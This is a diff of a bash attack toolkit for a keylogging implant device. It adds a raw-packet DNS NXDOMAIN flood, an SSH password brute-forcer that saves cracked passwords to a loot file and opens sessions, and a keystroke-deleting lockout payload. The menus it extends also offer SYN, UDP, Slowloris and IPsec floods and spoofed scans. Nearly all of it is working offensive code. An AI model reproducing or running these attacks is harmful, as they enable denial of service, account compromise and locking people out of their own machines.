-#----START CHECK UPTIME
+#----Recon pentmenu START CHECK UPTIME
 ##
 checkuptime() {
 	echo -ne "$(Info_Screen '
@@ -1162,7 +1182,7 @@ hping3 --tcp-timestamp -S $TARGET -p $PORT -c $RETRY | grep uptime
 echo -ne "\n${green}Done.${clear}\n"
 }
 ##
-#----START IPSEC SCAN
+#----Recon pentmenu START IPSEC SCAN
 ##
 #----we need to know where to scan
 ipsecscan() {
@@ -1178,18 +1198,18 @@ GROUPLIST="1 2 5 12"
 for ENC in $ENCLIST; do
 	for HASH in $HASHLIST; do
 		for AUTH in $AUTHLIST; do
-		for GROUP in $GROUPLIST; do
-		echo "--trans=$ENC,$HASH,$AUTH,$GROUP" | xargs --max-lines=8 ike-scan --retry=1 -R -M $TARGET | grep -v "Starting" | grep -v "0 returned handshake; 0 returned notify"
+			for GROUP in $GROUPLIST; do
+			echo "--trans=$ENC,$HASH,$AUTH,$GROUP" | xargs --max-lines=8 ike-scan --retry=1 -R -M $TARGET | grep -v "Starting" | grep -v "0 returned handshake; 0 returned notify"
+			done
 		done
-	done
 	done
 done
 }
 ##
-#----DOS menu
+#----Recon pentmenu DOS menu
 ##
 dosmenu() {
-MenuTitle DOS FLOOD MENU ; MenuColor 21 1 ICMP ECHO FLOOD ; MenuColor 21 2 ICMP BLACKNURSE ; MenuColor 21 3 TCP SYN FLOOD ; MenuColor 21 4 TCP ACK FLOOD ; MenuColor 21 5 TCP RST FLOOD ; MenuColor 21 6 TCP XMAS FLOOD
+MenuTitle PENTMENU DOS FLOOD MENU ; MenuColor 21 1 ICMP ECHO FLOOD ; MenuColor 21 2 ICMP BLACKNURSE ; MenuColor 21 3 TCP SYN FLOOD ; MenuColor 21 4 TCP ACK FLOOD ; MenuColor 21 5 TCP RST FLOOD ; MenuColor 21 6 TCP XMAS FLOOD
 MenuColor 21 7 UDP FLOOD ; MenuColor 21 8 SSL DOS ; MenuColor 21 9 SLOWLORIS ; MenuColor 20 10 IPsec DOS ; MenuColor 20 11 DISTRACTION SCAN ; MenuColor 20 12 DNS NXDOMAIN FLOOD ; MenuColor 20 13 RETURN TO MAIN MENU
 MenuEnd 24
 	case $m_a in
@@ -1210,7 +1230,7 @@ else
 fi
 }
 ##
-#----START ICMP FLOOD
+#----Recon pentmenu START ICMP FLOOD
 ##
 icmpflood() {
 	echo -ne "$(Info_Screen '
@@ -1236,10 +1256,11 @@ else
 fi
 }
 ##
-#----START BLACK NURSE
+#----Recon pentmenu START BLACK NURSE
 ##
 blacknurse() {
-	echo -ne "$(Info_Screen 'Preparing to launch ICMP Blacknurse Flood using hping3')\n\n"
+	echo -ne "$(Info_Screen '
+Preparing to launch ICMP Blacknurse Flood using hping3')\n\n"
 #----need a target IP/hostname
 	target_input
 #----What source address to use? Manually defined, or random, or outgoing interface IP?
@@ -1261,10 +1282,11 @@ else
 fi
 }
 ##
-#----START TCP SYN FLOOD
+#----Recon pentmenu START TCP SYN FLOOD
 ##
 synflood() {
-	echo -ne "$(Info_Screen 'TCP SYN Flood uses hping3...checking for hping3...')\n\n"
+	echo -ne "$(Info_Screen '
+TCP SYN Flood uses hping3...checking for hping3...')\n\n"
 if test -f "/usr/sbin/hping3"; then
 	echo -ne "${green}hping3 found, continuing!${clear}\n";
 #----hping3 is found, so use that for TCP SYN Flood
@@ -1337,10 +1359,11 @@ fi
 fi
 }
 ##
-#----START TCP ACK FLOOD
+#----Recon pentmenu START TCP ACK FLOOD
 ##
 ackflood() {
-	echo -ne "$(Info_Screen 'TCP ACK Flood uses hping3...checking for hping3...')\n\n"
+	echo -ne "$(Info_Screen '
+TCP ACK Flood uses hping3...checking for hping3...')\n\n"
 if test -f "/usr/sbin/hping3"; then
 	echo -ne "${green}hping3 found, continuing!${clear}\n";
 #----hping3 is found, so use that for TCP ACK Flood
@@ -1413,7 +1436,7 @@ fi
 fi
 }
 ##
-#----START TCP RST FLOOD
+#----Recon pentmenu START TCP RST FLOOD
 ##
 rstflood() {
 	echo -ne "$(Info_Screen '
@@ -1490,7 +1513,7 @@ fi
 fi
 }
 ##
-#----START TCP XMAS FLOOD
+#----Recon pentmenu START TCP XMAS FLOOD
 ##
 xmasflood() {
 	echo -ne "$(Info_Screen '
@@ -1566,7 +1589,7 @@ fi
 fi
 }
 ##
-#----START UDP FLOOD
+#----Recon pentmenu START UDP FLOOD
 ##
 udpflood() {
 	echo -ne "$(Info_Screen '
@@ -1634,7 +1657,7 @@ fi
 fi
 }
 ##
-#----START SSL DOS
+#----Recon pentmenu START SSL DOS
 ##
 ssldos() {
 echo -ne "$(Info_Screen '
@@ -1679,7 +1702,7 @@ done
 fi
 }
 ##
-#----START SLOW LORIS
+#----Recon pentmenu START SLOW LORIS
 ##
 slowloris() {
 	echo -ne "$(Info_Screen '
@@ -1721,20 +1744,20 @@ if [[ "$SSL" = "y" ]]; then
 	echo -ne "${green}Launching Slowloris....Use 'Ctrl c' to exit prematurely${clear}\n" && sleep 1
 	i=1
 while [ "$i" -le "$CONNS" ]; do
-	echo -ne "${yellow}Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds${clear}" ; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $LHOST $LPORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
+	echo -ne "${yellow}Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds${clear}\n" ; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $LHOST $LPORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
 	echo -ne "${yellow}Opened $CONNS connections....returning to menu${clear}\n"
 else
 #----if SSL is not chosen, launch the attack on the server without using a local listener
 	echo -ne "${green}Launching Slowloris....Use 'Ctrl c' to exit prematurely${clear}\n" && sleep 1
 	i=1
 while [ "$i" -le "$CONNS" ]; do
-	echo -ne "${yellow}Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds${clear}" ; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
+	echo -ne "${yellow}Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds${clear}\n" ; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
 #----return to menu once requested number of connections has been opened or resources are exhausted
 	echo -ne "${yellow}Opened $CONNS connections....returning to menu${clear}\n"
 fi
 }
 ##
-#----START IPSEC DOS
+#----Recon pentmenu START IPSEC DOS
 ##
 ipsecdos() {
 	echo -ne "$(Info_Screen '
@@ -1747,7 +1770,7 @@ do ike-scan -A -B 100M -t 1 --sourceip=random $TARGET 1>/dev/null; ike-scan -B 1
 done
 }
 ##
-#----START DISTRACTION
+#----Recon pentmenu START DISTRACTION
 ##
 distractionscan() {
 	echo -ne "$(Info_Screen '
@@ -1762,7 +1785,7 @@ distractionscan() {
 for i in {1..50}; do echo -ne "${green}sending scan $i${clear}" && hping3 --scan all --spoof $SOURCE -S $TARGET 2>/dev/null 1>/dev/null; done
 }
 ##
-#----START NXDOMAIN FLOOD
+#----Recon pentmenu START NXDOMAIN FLOOD
 ##
 nxdomainflood() {
 	echo -ne "$(Info_Screen '
@@ -1770,12 +1793,49 @@ nxdomainflood() {
 -for domains that do not exist')\n\n"
 	read_all Enter the IP address of the target DNS server ; DNSTARGET=${r_a}
 	echo -ne "${green}Starting DNS NXDOMAIN Query Flood to $DNSTARGET${clear}\n" && sleep 1
+	echo -ne "${yellow}No output will be shown. Use 'Ctrl c' to stop!${clear}\n"
+#loop forever!
 while :
-do dig $RANDOM.$RANDOM$RANDOM @$DNSTARGET
+do
+#create transaction ID for DNS query
+	TRANS=$(( $RANDOM ))
+#convert to hex
+	printf -v TRANSID "%x\n" "$TRANS"
+#cut it into bytes
+	TRANSID1=$(echo $TRANSID | cut -b 1,2 | xargs)
+	TRANSID2=$(echo $TRANSID | cut -b 3,4 | xargs)
+#if single byte or no byte, prepend 0
+if [[ ${#TRANSID1} = "1" ]]; then
+	TRANSID1=0$TRANSID
+elif [[ ${#TRANSID2} = "0" ]]; then
+	TRANSID2=00
+elif [[ ${#TRANSID2} = "1" ]]; then
+	TRANSID2=0$TRANSID
+fi
+#now we have transaction ID, generate random alphanumeric name to query
+	TLDLIST=(com br net org cz au co jp cn ru in ir ua ca xyz site top icu vip online de $RANDOM foo)
+	TLD="${TLDLIST[ $(expr $(( $RANDOM )) \% ${#TLDLIST[*]}) ]}"
+	RANDLONG=$(( $RANDOM % 20 + 1 ))
+	STRING=$(< /dev/urandom tr -cd '[:alnum:]' | tr -d '\\' | head -c $RANDLONG)
+#calculate length of name we are querying as hex
+	STRINGLEN=(${#STRING})
+	printf -v STRINGLENHEX "%x\n" "$STRINGLEN"
+	STRINGLENHEX=$(echo $STRINGLENHEX | xargs)
+if [[ ${#STRINGLENHEX} = "1" ]]; then 
+	STRINGLENHEX=0$STRINGLENHEX
+fi
+#do the same for TLD
+	TLDLEN=(${#TLD})
+	printf -v TLDLENHEX "%x\n" "$TLDLEN"
+	TLDLENHEX=$(echo $TLDLENHEX | xargs)
+#forge a DNS request and send to netcat
+	ATTACKSTRING="\x$TRANSID1\x$TRANSID2\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x$STRINGLENHEX$STRING\x$TLDLENHEX$TLD\x00\x00\x01\x00\x01"
+#echo $ATTACKSTRING
+	echo -ne $ATTACKSTRING | nc -u -w 1 $DNSTARGET 53
 done
 }
 ##
-#----EXTRACTION menu
+#----Recon pentmenu EXTRACTION menu
 ##
 extractionmenu() {
 MenuTitle EXTRACTION MENU ; MenuColor 20 1 SEND FILE ; MenuColor 20 2 CREATE LISTENER ; MenuColor 20 3 RETURN TO MAIN MENU ; MenuEnd 23
@@ -1784,7 +1844,7 @@ MenuTitle EXTRACTION MENU ; MenuColor 20 1 SEND FILE ; MenuColor 20 2 CREATE LIS
 	esac
 }
 ##
-#----START SENDFILE
+#----Recon pentmenu START SENDFILE
 ##
 sendfile() {
 echo -ne "$(Info_Screen '
@@ -1820,7 +1880,7 @@ sha512sum $EXTRACT
 sleep 1
 }
 ##
-#----START LISTENER
+#----Recon pentmenu START LISTENER
 ##
 listener() {
 echo -ne "$(Info_Screen '
@@ -1881,14 +1941,15 @@ sha512sum $OUTFILE
 sleep 1
 }
 ##
-#----START SHOW README
+#----Recon pentmenu START SHOW README
 ##
 #----use curl to show the readme file
 showreadme() {
-curl -s https://raw.githubusercontent.com/GinjaChris/pentmenu/master/README.md | more
+	user_agent_random
+curl -s -A "$userAgent" https://raw.githubusercontent.com/GinjaChris/pentmenu/master/README.md | more
 }
 ##
-#----START STUNNEL
+#----Recon pentmenu START STUNNEL
 ##
 stunnel_client() {
 	read_all use SSL/TLS? [y]es or [n]o default ; SSL=${r_a}
@@ -1896,7 +1957,7 @@ stunnel_client() {
 #----if not using SSL/TLS, carry on what we were doing
 #----otherwise create an SSL/TLS tunnel using a local listener on TCP port 9991
 if [[ "$SSL" = "y" ]]; then
-	echo -ne "${yellow}Using SSL/TLS${clear}"
+	echo -ne "${yellow}Using SSL/TLS${clear}\n"
 	LHOST=127.0.0.1
 	LPORT=9991
 #----ascertain if stunnel is defined in /etc/services and if not, add it & set permissions correctly
@@ -1915,7 +1976,7 @@ fi
 	$LISTPORT -tln | grep -q $LPORT
 if [[ "$?" = "1" ]]; then
 #----if nothing is running on port 9991, create stunnel configuration
-	echo -ne "${yellow}Creating stunnel client on ${clear}\n$LHOST:$LPORT"
+	echo -ne "${yellow}Creating stunnel client on ${clear} $LHOST:$LPORT\n"
 	rm -f /etc/stunnel/pentmenu.conf;
 	touch /etc/stunnel/pentmenu.conf && chmod 777 /etc/stunnel/pentmenu.conf
 	echo "[PENTMENU-CLIENT]" >> /etc/stunnel/pentmenu.conf
@@ -1934,7 +1995,7 @@ fi
 mainmenu
 }
 ##
-#----Recon scan menu
+#----Recon Croc_Pot scan main/menu
 ##
 MenuTitle RECON SCAN MENU ; MenuColor 20 1 TCPDUMP SCAN MENU ; MenuColor 20 2 NMAP SCAN MENU ; MenuColor 20 3 TRACEROUTE SCAN ; MenuColor 20 4 WHOIS LOOKUP SCAN ; MenuColor 20 5 DNS LOOKUP SCAN
 MenuColor 20 6 PING TARGET SCAN ; MenuColor 20 7 TARGET PORT SCAN ; MenuColor 20 8 SSL/TLS SSLSCAN ; MenuColor 20 9 PHONE NUMBER LOOKUP ; MenuColor 19 10 DNS LEAK TEST
@@ -2165,7 +2226,7 @@ setup_vpn() {
 ##
 	install_package openvpn OPENVPN setup_vpn croc_vpn
 ##
-#----VPN user input
+#----VPN user input credentials
 ##
 if [ -f ${vpn_file} ]; then
 	echo -ne "\n$(ColorYellow 'FOUND .ovpn FILE MOVING IT TO ect/openvpn')\n"
@@ -2189,7 +2250,7 @@ MenuTitle VPN MENU ; MenuColor 19 1 VPN SETUP ; MenuColor 19 2 ENABLE VPN ; Menu
 	esac
 }
 ##
-#----Croc Pot Plus Pass time
+#----Croc Pot Plus Pass time/games
 ##
 function pass_time() {
 	clear
@@ -5366,13 +5427,224 @@ if [[ \${#var} -gt \${char} ]] ; then\n	LED OFF\n	DISABLE_PAYLOAD payloads/Croc_
 fi
 }
 ##
+#----Brute-force attack on ssh host
+##
+Brute_force() {
+	clear
+	echo -ne "$(Info_Screen '
+-Payload call Croc_Force, Brute-force attack on ssh host
+-Brute-force attack consists of an attacker submitting many passwords or
+passphrases with the hope of eventually guessing correctly.
+-Add your own word list or install american-english-huge list
+-Run Croc_Force live and if successful view passwd & start ssh session
+-Run Croc_Force_payload will run in background, match word is crocforce
+if successful save to loot/Croc_Pot/Croc_Force_Passwd.txt
+Edit payload for target: IP, hostname and full path of word list
+when running payload the LED lights
+-LED red -> and nothing after target is unreachable & payload disable
+-LED flash red & blue -> attempting Brute-force attack
+-LED green -> successful & payload disable
+-Requirements: SSHPASS')\n"
+install_package sshpass SSHPASS Brute_force
+##
+#----Croc_force payload install
+##
+local CROC_FORCE=/root/udisk/payloads/Croc_Force_payload.txt
+if [ -f ${CROC_FORCE} ]; then
+	echo -ne "\n${red}${LINE_}${clear}$(ColorGreen 'CROC_FORCE PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
+else
+	read_all INSTALL CROC_FORCE PAYLOAD Y/N AND PRESS [ENTER]
+case $r_a in
+[yY] | [yY][eE][sS])
+read_all ENTER TARGET HOST NAME AND PRESS [ENTER] ; local T_H=${r_a}
+read_all ENTER TARGET IP AND PRESS [ENTER] ; local T_IP=${r_a}
+if [[ ${T_IP} =~ ${validate_ip} ]]; then
+	echo -ne "${green}IP OK${clear}\n"
+else
+	invalid_entry ; Brute_force
+fi
+echo -ne "${yellow}Add ramdom numbers to the end of each word enter 0 for no numbers\nOr enter 10 or 100 or 1000 depend on how many numbers at end of word${clear}\n"
+read_all ADD NUMBERS TO WORD ENTER THE RAMDOM NUMBER AMOUNT ; local U_N=${r_a}
+echo -ne "${yellow}Enter the full path of word list or use /usr/share/dict/american-english-huge${clear}\n"
+read_all ENTER FULL PATH OF YOUR WORD LIST LOCATION AND PRESS [ENTER]
+if [ -f "${r_a}" ]; then
+	echo -ne "${yellow}Word list was located${clear}\n"
+	local U_L=${r_a}
+else
+	invalid_entry ; echo -ne "\n${red}Did not find Word list please try again${clear}\n" ; Brute_force
+fi
+	echo -ne "# Title:         Croc_Force\n#\n# Description:   Brute-force attack consists of an attacker submitting many passwords or\n#                passphrases with the hope of eventually guessing correctly. Requirements: SSHPASS
+#                Save to loot/Croc_Pot/Croc_Force_Passwd.txt\n#\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n\nMATCH crocforce\n\n#--->Add Target IP here\nT_IP=${T_IP}\n\n#--->Add Target HOSTNAME here
+T_H=${T_H}\n\n#--->Add the full path of word list here or install wamerican-huge add use /usr/share/dict/american-english-huge\nWORDFILE=\"${U_L}\"\n
+#--->Add ramdom numbers to the end of each word enter 0 for no numbers Or enter 10 or 100 or 1000 depend on how many numbers at end of word\nNUMBER_N=${U_N}\ntL=\`awk 'NF!=0 {++c} END {print c}' \$WORDFILE\`\n\nnc -z -v -w 1 \$T_IP 22 &>/dev/null 2>&1
+if [[ \$? -ne 0 ]]; then\n	LED R && RELOAD_PAYLOADS && exit\nelse\n	LED B\nfi\n\nwhile true ; do\n	LED B\nrnum=\$((RANDOM%\${tL}+1))\nR_W=\$(sed -n \"\$rnum p\" \$WORDFILE)\n\nif [ ! \"\${NUMBER_N}\" = \"0\" ] ; then\n	R_N=\$(( \$RANDOM % \${NUMBER_N}+1 ))
+else\n	unset R_N\nfi\n\nif [[ \"\$(sshpass -p \$R_W\$R_N ssh -o \"StrictHostKeyChecking no\" \$T_H@\$T_IP 'echo ok' | sed 's/\\\r//g')\" = \"ok\" ]]; then
+	echo -ne \"Target Hostname: \$T_H\\\nTarget IP: \$T_IP\\\nTarget password: \$R_W\$R_N\" > /root/udisk/loot/Croc_Pot/Croc_Force_Passwd.txt\n	LED G\n	break\nelse\n	LED R\nfi\ndone" >> ${CROC_FORCE}
+	echo -ne "\n${red}${LINE_}${clear}$(ColorGreen 'CROC_FORCE PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n" ;;
+[nN] | [nN][oO])
+	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
+*)
+	invalid_entry ; Brute_force ;;
+esac
+fi
+##
+#----Croc_force start BRUTE-FORCE ATTACK
+##
+read_all START BRUTE-FORCE ATTACK Y/N AND PRESS [ENTER] ; local B_M=${r_a}
+case $B_M in
+[yY] | [yY][eE][sS])
+	read_all AMERICAN ENGLISH WORD LIST [Y] ADD WORD LIST [N] AND PRESS [ENTER] ; local W_L=${r_a}
+	case $W_L in
+		[yY] | [yY][eE][sS])
+			install_package wamerican-huge AMERICAN_WORDLIST Brute_force ; local U_L="/usr/share/dict/american-english-huge"
+			echo -ne "\n${green}Word list was located ${clear}->${U_L}\n" ;;
+		[nN] | [nN][oO])
+			read_all ENTER FULL PATH OF YOUR WORD LIST LOCATION AND PRESS [ENTER]
+			if [ -f "${r_a}" ]; then
+			local U_L=${r_a}
+			echo -ne "\n${green}Word list was located ${clear}->${U_L}\n"
+			else
+			invalid_entry ; echo -ne "\n${red}Did not find Word list please try again${clear}\n" ; Brute_force
+			fi ;;
+		*)
+			invalid_entry ; Brute_force ;;
+	esac
+echo -ne "${yellow}Add ramdom numbers to the end of each word enter 0 for no numbers\nOr enter 10 or 100 or 1000 depend on how many numbers at end of word${clear}\n"
+read_all ADD NUMBERS TO WORD ENTER THE RAMDOM NUMBER AMOUNT ; local U_N=${r_a}
+read_all ENTER TARGET IP AND PRESS [ENTER] ; local T_IP=${r_a}
+	if [[ ${T_IP} =~ ${validate_ip} ]]; then
+		ping -q -c 1 -w 1 ${T_IP} &>/dev/null 2>&1
+		if [[ $? -ne 0 ]]; then
+			LED R
+			echo -ne "\n${red}Unable to reach host ${clear}->${T_IP}\n"
+			sleep 1
+			Brute_force
+		elif [[ "${#args[@]}" -eq 0 ]]; then
+			read_all ENTER TARGET HOST NAME AND PRESS [ENTER] ; local T_H=${r_a}
+		fi
+	else
+		invalid_entry ; Brute_force
+	fi
+local WORDFILE=${U_L}
+local NUMBER_N=${U_N}
+local tL=`awk 'NF!=0 {++c} END {print c}' $WORDFILE`
+local broken=0
+break_script() {
+	broken=1
+}
+	trap break_script SIGINT
+while true ; do
+	LED B
+	rnum=$((RANDOM%${tL}+1))
+	R_W=$(sed -n "$rnum p" $WORDFILE)
+if [ ! "${NUMBER_N}" = "0" ] ; then
+	R_N=$(( $RANDOM % ${NUMBER_N}+1 ))
+else
+	unset R_N
+fi
+	echo -e "${yellow}Trying:${clear} $R_W$R_N"
+if [[ "$(sshpass -p $R_W$R_N ssh -o "StrictHostKeyChecking no" $T_H@$T_IP 'echo ok' | sed 's/\r//g')" = "ok" ]]; then
+	LED G
+	echo -ne "${yellow}Target Hostname: ${clear}$T_H\n${yellow}Target IP: ${clear}$T_IP\n${yellow}password is:${clear} ${green}$R_W$R_N${clear}\n" | tee /root/udisk/loot/Croc_Pot/Croc_Force_Passwd.txt
+	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" /root/udisk/loot/Croc_Pot/Croc_Force_Passwd.txt
+	read_all START SSH SESSION Y/N PRESS [ENTER] ; local ST_SS=${r_a}
+	case $ST_SS in
+		[yY] | [yY][eE][sS])
+			sshpass -p ${R_W}${R_N} ssh ${T_H}@${T_IP} ;;
+		[nN] | [nN][oO])
+			echo -ne "\n$(ColorYellow 'Check at loot/Croc_Pot/Croc_Force_Passwd.txt')\n";;
+	esac
+	break
+elif [ $broken -eq 1 ]; then
+	break
+else
+	LED R
+fi
+done ;;
+[nN] | [nN][oO])
+	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ; install_payloads ;;
+*)
+	invalid_entry ; Brute_force ;;
+esac
+}
+##
+#----Croc_Lockout Payload install
+##
+croc_lock() {
+	clear
+	echo -ne "$(Info_Screen '
+-Croc_Lockout payload match word croclockout
+-Prevent user from logging-in this will delete all keystroke entry
+-To stop payload type in stop
+-If stuck in loop unplug keycroc plug back in
+-If CrocUnlock Payload is installed this will remove it
+they both use Q GUI-l in the payload')\n"
+	local Croc_lockout=/root/udisk/payloads/Croc_Lockout.txt
+	if [ -e "${Croc_lockout}" ]; then
+	echo -ne "\n$(ColorGreen 'Croc_Lockout PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')\n"
+else
+read_all INSTALL CROC_LOCKOUT PAYLOAD Y/N AND PRESS [ENTER]
+case $r_a in
+[yY] | [yY][eE][sS])
+	echo -ne "# Title:         Croc_Lockout\n#\n# Description:   Prevent user from logging-in this will delete all keystroke entry\n#                To stop payload type in stop If stuck in loop unplug keycroc plug back in
+#\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n\nMATCH croclockout\n\nQ GUI-l\n#Q CONTROL-ALT-F3\n\nif [ -e \"/root/udisk/payloads/Croc_unlock_1.txt\" ]; then
+rm /root/udisk/payloads/Croc_unlock_1.txt /root/udisk/payloads/Croc_unlock_2.txt\nfi\n\nSAVEKEYS /tmp/Croc_Lockout_stop.txt UNTIL stop\n\nwhile true ; do\nLED ATTACK\nWAIT_FOR_KEYBOARD_ACTIVITY 0
+if [ \$(sed -n 's/.*\(stop\).*/\1/p' /tmp/Croc_Lockout_stop.txt.filtered) = \"stop\" ]; then\n	LED B\n	sleep 1\n	LED OFF\n	\$RELOAD_PAYLOADS\n	break\nelse\n	LED R\n	Q CONTROL-SHIFT-LEFTARROW\n	Q BACKSPACE\nfi\ndone\n " >> ${Croc_lockout}
+	echo -ne "\n$(ColorGreen 'Croc_Lockout PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')\n" ;;
+[nN] | [nN][oO])
+	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
+*)
+	invalid_entry ; croc_lock ;;
+esac
+fi
+##
+#----Croc_Lockout start lockout now
+##
+read_all START CROC_LOCKOUT NOW Y/N AND PRESS [ENTER]
+case $r_a in
+[yY] | [yY][eE][sS])
+	echo -ne "\n${yellow}PRESS CTRL + C TO STOP LOOP${clear}\n"
+	if [ -e "/root/udisk/payloads/Croc_unlock_1.txt" ]; then
+		rm /root/udisk/payloads/Croc_unlock_1.txt /root/udisk/payloads/Croc_unlock_2.txt
+		$RELOAD_PAYLOADS
+	fi
+local broken=0
+break_script() {
+	broken=1
+}
+trap break_script SIGINT
+Q GUI-l
+Q CONTROL-ALT-F3
+while true ; do
+LED ATTACK
+WAIT_FOR_KEYBOARD_ACTIVITY 0
+if [ $broken -eq 1 ]; then
+	LED B
+	sleep 1
+	LED OFF
+	break
+else
+	LED R
+	Q CONTROL-SHIFT-LEFTARROW
+	Q BACKSPACE
+fi
+done ;;
+[nN] | [nN][oO])
+	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
+*)
+	invalid_entry ; croc_lock ;;
+esac
+}
+##
 #----Install Payloads Menu
 ##
 MenuTitle INSTALL PAYLOADS MENU ; MenuColor 21 1 GETONLINE PAYLOAD ; MenuColor 21 2 CROCUNLOCK PAYLOAD ; MenuColor 21 3 WIFI SETUP PAYLOAD ; MenuColor 21 4 QUICK START CROC_POT
-MenuColor 21 5 CROCSHOT PAYLOAD ; MenuColor 21 6 CROC_BITE PAYLOAD ; MenuColor 21 7 OPEN WEB SITE ; MenuColor 21 8 KEEP SCREEN ON ; MenuColor 21 9 REPLACE USER TEXT ; MenuColor 20 10 RETURN TO MAIN MENU ; MenuEnd 24
+MenuColor 21 5 CROCSHOT PAYLOAD ; MenuColor 21 6 CROC_BITE PAYLOAD ; MenuColor 21 7 OPEN WEB SITE ; MenuColor 21 8 KEEP SCREEN ON ; MenuColor 21 9 REPLACE USER TEXT
+MenuColor 20 10 BRUTE FORCE ATTACK ; MenuColor 20 11 CROC_LOCKOUT PAYLOAD ; MenuColor 20 12 RETURN TO MAIN MENU ; MenuEnd 24
 	case $m_a in
 	1) get_online_p ; install_payloads ;; 2) croc_unlock_p ; install_payloads ;; 3) wifi_setup_p ; install_payloads ;; 4) quick_croc_pot ; install_payloads ;; 5) screen_shot ; install_payloads ;;
-	6) croc_bite ; install_payloads ;; 7) web_site ; install_payloads ;; 8) screen_on ;; 9) text_replace ; install_payloads ;; 10) main_menu ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; install_payloads ;;
+	6) croc_bite ; install_payloads ;; 7) web_site ; install_payloads ;; 8) screen_on ;; 9) text_replace ; install_payloads ;; 10) Brute_force ; install_payloads ;;
+	11) croc_lock ; install_payloads ;; 12) main_menu ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; install_payloads ;;
 	esac
 }
 ##
@@ -5585,11 +5857,11 @@ menu_B
 function croc_status() {
 	local LOOT_INFO=/root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt
 ##
-#----SSH Install screenfetch 
+#----status Install screenfetch 
 ##
 	install_package screenfetch SCREENFETCH croc_status
 ##
-#----SSH Display screenfetch 
+#----status Display screenfetch 
 ##
 	echo -ne "\n\e[48;5;202;30m${LINE}${clear}\n"
 	screenfetch 2> /dev/null
@@ -5598,10 +5870,12 @@ function croc_status() {
 memory_check() {
 	clear
 	rm ${LOOT_INFO}
-	croc_title_loot | tee ${LOOT_INFO} ; echo -e "\n\t${LINE_}MEMORY STATUS${LINE_}\n" | tee -a ${LOOT_INFO} ; cd / ; for i in `ls -d */` ; do g=`find ./$i -type f -print | wc -l` ; echo "Directory $i contains $g files."; done ; echo ${LINE} | tee -a ${LOOT_INFO}
+	croc_title_loot | tee ${LOOT_INFO} ; echo -e "\n\t${LINE_}MEMORY STATUS${LINE_}\n" | tee -a ${LOOT_INFO}
 	echo -ne "\n$(ColorYellow 'Memory usage on') ${server_name} is:\n" | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; df -h | xargs | awk '{print "Free/total disk: " $11 " / " $9}' | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
 	egrep --color=auto 'Mem|Cache|Swap' /proc/meminfo | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; free -t -m | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; cat /proc/meminfo | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
 	vmstat | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; df -h | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; iostat | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
+	echo -ne "${cyan}KEYCROC-DIRECTORY${clear}\n" | tee -a ${LOOT_INFO} ; cd / ; for i in `ls -d */` ; do g=`find ./$i -type f -print | wc -l` ; echo -ne "${yellow}Directory: ${clear}${cyan}${i} ${clear}${yellow}Contains: ${clear}${green}${g} ${clear}${yellow}files.${clear}\n"; done 2> /dev/null | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
+	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" ${LOOT_INFO}
 }
 cpu_check() {
 	clear
